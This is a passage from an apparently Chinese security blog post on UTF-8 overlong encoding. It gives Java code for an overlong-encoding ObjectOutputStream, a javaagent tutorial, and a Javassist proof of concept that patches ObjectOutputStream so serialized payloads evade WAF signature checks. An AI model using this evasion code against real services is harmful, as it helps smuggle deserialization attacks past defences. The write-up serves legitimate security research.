        map.put('q', new int[]{0xc1, 0xb1});
        map.put('r', new int[]{0xc1, 0xb2});
        map.put('s', new int[]{0xc1, 0xb3});
        map.put('t', new int[]{0xc1, 0xb4});
        map.put('u', new int[]{0xc1, 0xb5});
        map.put('v', new int[]{0xc1, 0xb6});
        map.put('w', new int[]{0xc1, 0xb7});
        map.put('x', new int[]{0xc1, 0xb8});
        map.put('y', new int[]{0xc1, 0xb9});
        map.put('z', new int[]{0xc1, 0xba});
        map.put('A', new int[]{0xc1, 0x81});
        map.put('B', new int[]{0xc1, 0x82});
        map.put('C', new int[]{0xc1, 0x83});
        map.put('D', new int[]{0xc1, 0x84});
        map.put('E', new int[]{0xc1, 0x85});
        map.put('F', new int[]{0xc1, 0x86});
        map.put('G', new int[]{0xc1, 0x87});
        map.put('H', new int[]{0xc1, 0x88});
        map.put('I', new int[]{0xc1, 0x89});
        map.put('J', new int[]{0xc1, 0x8a});
        map.put('K', new int[]{0xc1, 0x8b});
        map.put('L', new int[]{0xc1, 0x8c});
        map.put('M', new int[]{0xc1, 0x8d});
        map.put('N', new int[]{0xc1, 0x8e});
        map.put('O', new int[]{0xc1, 0x8f});
        map.put('P', new int[]{0xc1, 0x90});
        map.put('Q', new int[]{0xc1, 0x91});
        map.put('R', new int[]{0xc1, 0x92});
        map.put('S', new int[]{0xc1, 0x93});
        map.put('T', new int[]{0xc1, 0x94});
        map.put('U', new int[]{0xc1, 0x95});
        map.put('V', new int[]{0xc1, 0x96});
        map.put('W', new int[]{0xc1, 0x97});
        map.put('X', new int[]{0xc1, 0x98});
        map.put('Y', new int[]{0xc1, 0x99});
        map.put('Z', new int[]{0xc1, 0x9a});
    }

    public OverlongExp(OutputStream out) throws IOException {
        super(out);
    }

    public void writeUTF(String str) throws IOException {

        writeShort(str.length() * 2);
        for (int i = 0; i < str.length(); i++) {
            int[] bs = map.get(str.charAt(i));
            super.write(bs[0]);
            super.write(bs[1]);
        }
    }
}
```

## java agent

### [javaagent使用指南](https://www.cnblogs.com/rickiyang/p/11368932.html "发布于 2019-08-17 15:51")

#### Premain

Javaagent是java命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：

1. 这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。
2. Premain-Class 指定的那个类必须实现 premain() 方法。

premain 方法，从字面上理解，就是运行在 main 函数之前的的类。当Java 虚拟机启动时，在执行 main 函数之前，JVM 会先运行`-javaagent`​所指定 jar 包内 Premain-Class 这个类的 premain 方法 。

工程目录结构如下：

```txt
-java-agent
----src
--------main
--------|------java
--------|----------com.example.agent
--------|------------PreMainTraceAgent
--------|resources
-----------META-INF
--------------MANIFEST.MF
```

MANIFREST.MF：

```txt
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: PreMainTraceAgent
```

或者不去手动写MANIFREST.MF文件的方式，使用maven插件：

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-jar-plugin</artifactId>
    <version>3.1.0</version>
    <configuration>
        <archive>
            <!--自动添加META-INF/MANIFEST.MF -->
            <manifest>
                <addClasspath>true</addClasspath>
            </manifest>
            <manifestEntries>
                <Premain-Class>com.example.agent.PreMainTraceAgent</Premain-Class>
                <Agent-Class>com.example.agent.PreMainTraceAgent</Agent-Class>
                <Can-Redefine-Classes>true</Can-Redefine-Classes>
                <Can-Retransform-Classes>true</Can-Retransform-Classes>
            </manifestEntries>
        </archive>
    </configuration>
</plugin>
```

```java
package com.example.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.Date;

public class PreMainTraceAgent {

    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("agentArgs : " + agentArgs);
        inst.addTransformer(new MyClassTransformer(), true);
    }

    static class DefineTransformer implements ClassFileTransformer{

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            System.out.println("premain load Class:" + className);
            return classfileBuffer;
        }
    }
```

然后使用maven插件打包即可

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192054550.png)

然后在需要使用的时候加上jar即可, 可以发现

1. 执行main方法之前会加载所有的类，包括系统类和自定义类；
2. 在ClassFileTransformer中会去拦截系统类和自己实现的类对象；
3. 如果你有对某些类对象进行改写，那么在拦截的时候抓住该类使用字节码编译工具即可实现。

#### Agentmain

上面介绍的Instrumentation是在 JDK 1.5中提供的，开发者只能在main加载之前添加手脚，在 Java SE 6 的 Instrumentation 当中，提供了一个新的代理操作方法：agentmain，可以在 main 函数开始运行之后再运行。

```xml
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: com.example.agent.AgentMainTest
```

或者

```xml
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-jar-plugin</artifactId>
  <version>3.1.0</version>
  <configuration>
    <archive>
      <!--自动添加META-INF/MANIFEST.MF -->
      <manifest>
        <addClasspath>true</addClasspath>
      </manifest>
      <manifestEntries>
        <Agent-Class>com.example.agent.AgentMainTest</Agent-Class>
        <Can-Redefine-Classes>true</Can-Redefine-Classes>
        <Can-Retransform-Classes>true</Can-Retransform-Classes>
      </manifestEntries>
    </archive>
  </configuration>
</plugin>
```

这样就能对已经执行的java服务进行`attach`​, 然后执行我们的`agentmain()`​中的代码:

```java
package com.example.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

/**
 * @author rickiyang
 * @date 2019-08-16
 * @Desc
 */
public class AgentMainTest {

    public static void agentmain(String agentArgs, Instrumentation instrumentation) {
        instrumentation.addTransformer(new DefineTransformer(), true);
    }

    static class DefineTransformer implements ClassFileTransformer {

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            System.out.println("premain load Class:" + className);
            return classfileBuffer;
        }
    }
}

```

```java
package com.example.agent_test;

import com.sun.tools.attach.*;

import java.io.IOException;
import java.util.List;

/**
 * @author rickiyang
 * @date 2019-08-16
 * @Desc
 */
public class TestAgentMain {

    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //获取当前系统中所有 运行中的 虚拟机
        System.out.println("running JVM start ");
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list) {
            //如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid
            //然后加载 agent.jar 发送给该虚拟机
            System.out.println(vmd.displayName());
            if (vmd.displayName().endsWith("com.example.agent_test.TestAgentMain")) {
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                virtualMachine.loadAgent("/Users/lnhsec/Desktop/Lnh/Java/agent/target/agent-0.0.1-SNAPSHOT.jar");
                virtualMachine.detach();
            }
        }
    }

}
```

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192055700.png)

### poc

这里是用`premain`​, 然后通过`javaagent`​来加载我们生成的jar包, 这里直接上最后的poc吧

```java
package com.example.waf.utf8;

import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
import java.io.IOException;

public class LnhTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            //拦截即将被加载或重加载的class
            if(className.equals("java/io/ObjectOutputStream$BlockDataOutputStream")) {
                System.out.println("111111111111111");
                ClassPool cp = ClassPool.getDefault();
                cp.importPackage(IOException.class.getName());
//                if (classBeingRedefined != null) {
//                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
//                    cp.insertClassPath(ccp);
//                }
                CtClass ctc = cp.get("java.io.ObjectOutputStream$BlockDataOutputStream");
                CtMethod method1 = ctc.getDeclaredMethod("getUTFLength", new CtClass[]{cp.get("java.lang.String")});
                ctc.removeMethod(method1);
                CtMethod make1=CtNewMethod.make("long getUTFLength(String s) {\n" +
                        "            int len = s.length();\n" +
                        "            long utflen = 0;\n" +
                        "            for (int off = 0; off < len; ) {\n" +
                        "                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n" +
                        "                s.getChars(off, off + csize, cbuf, 0);\n" +
                        "                for (int cpos = 0; cpos < csize; cpos++) {\n" +
                        "                    char c = cbuf[cpos];\n" +
//                        "                    if (c >= 0x0001 && c <= 0x0020) {\n" +
//                        "                        utflen++;\n" +
//                        "                    } else if (c > 0x07FF) {\n" +
//                        "                        utflen += 3;\n" +
//                        "                    } else {\n" +
                        "                        utflen += 2;\n" +
//                        "                    }\n" +
                        "                }\n" +
                        "                off += csize;\n" +
                        "            }\n" +
                        "            return utflen;\n" +
                        "        }",ctc);


                CtMethod method2 = ctc.getDeclaredMethod("writeUTFBody", new CtClass[]{cp.get("java.lang.String")});
                ctc.removeMethod(method2);

                CtMethod make2=CtMethod.make("private void writeUTFBody(String s) {\n" +
                        "            int limit = MAX_BLOCK_SIZE - 3;\n" +
                        "            int len = s.length();\n" +
                        "            for (int off = 0; off < len; ) {\n" +
                        "                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n" +
                        "                s.getChars(off, off + csize, cbuf, 0);\n" +
                        "                for (int cpos = 0; cpos < csize; cpos++) {\n" +
                        "                    char c = cbuf[cpos];\n" +
                        "                    if (pos <= limit) {\n" +
//                        "                        if (c <= 0x0020 && c != 0) {\n" +
//                        "                            buf[pos++] = (byte) c;\n" +
//                        "                        } else if (c > 0x07FF) {\n" +
//                        "                            buf[pos + 2] = (byte) (0x80 | ((c >> 0) & 0x3F));\n" +
//                        "                            buf[pos + 1] = (byte) (0x80 | ((c >> 6) & 0x3F));\n" +
//                        "                            buf[pos + 0] = (byte) (0xE0 | ((c >> 12) & 0x0F));\n" +
//                        "                            pos += 3;\n" +
//                        "                        } else {\n" +
                        "                            buf[pos + 1] = (byte) (0x80 | ((c >> 0) & 0x3F));\n" +
                        "                            buf[pos + 0] = (byte) (0xC0 | ((c >> 6) & 0x1F));\n" +
                        "                            pos += 2;\n" +
//                        "                        }\n" +
                        "                    } else {    // write one byte at a time to normalize block\n" +
//                        "                        if (c <= 0x0020 && c != 0) {\n" +
//                        "                            write(c);\n" +
//                        "                        } else if (c > 0x07FF) {\n" +
//                        "                            write(0xE0 | ((c >> 12) & 0x0F));\n" +
//                        "                            write(0x80 | ((c >> 6) & 0x3F));\n" +
//                        "                            write(0x80 | ((c >> 0) & 0x3F));\n" +
//                        "                        } else {\n" +
                        "                            write(0xC0 | ((c >> 6) & 0x1F));\n" +
                        "                            write(0x80 | ((c >> 0) & 0x3F));\n" +
//                        "                        }\n" +
                        "                    }\n" +
                        "                }\n" +
                        "                off += csize;\n" +
                        "            }\n" +
                        "        }",ctc);
                ctc.addMethod(make1);
                ctc.addMethod(make2);
                byte[] bytes = ctc.toBytecode();
                ctc.detach();

                System.out.println("maked");
                return bytes;
            }
        } catch (Exception e){
            e.printStackTrace();
        }
        return null;

    }
}
```

```java
package com.example.waf.utf8;

import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static void premain(String args, Instrumentation inst) throws Exception {
        inst.addTransformer(new LnhTransformer(), true);
        // 生成transform()
        inst.retransformClasses(new Class[] { Object.class });
        // 这里只是用来触发生成transform()
        // 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class
    }
}
```

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192055579.png)

## 参考

https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd

https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html

https://xz.aliyun.com/news/13737#toc-1

https://www.cnblogs.com/rickiyang/p/11368932.html

大哥@zjj